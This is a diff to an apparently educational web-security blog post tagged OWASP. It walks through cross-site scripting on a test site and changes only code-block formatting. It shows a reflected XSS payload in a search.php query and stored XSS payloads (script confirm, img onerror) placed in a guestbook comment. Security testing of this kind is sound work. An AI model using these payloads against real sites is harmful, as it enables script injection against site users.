@@ -8,18 +8,18 @@ tags=["web", "owasp"]
 
 Right off the bat, try hitting the search box with a simple XSS payload:
 
-{% highlight javascript %}
+```javascript
 search.php?query=<script>lt;script<script>gt;alert(1)<%2Fscript>&x=24&y=12
-{% endhighlight %}
+```
 
 #/guestbook.php
 
 Placing this:
 
-{% highlight html %}
+```html
 <script>confirm(1)</script>
 <img src=x onerror='confirm(2)' />
-{% endhighlight %}
+```
 
 into a comment body yields stored XSS
 
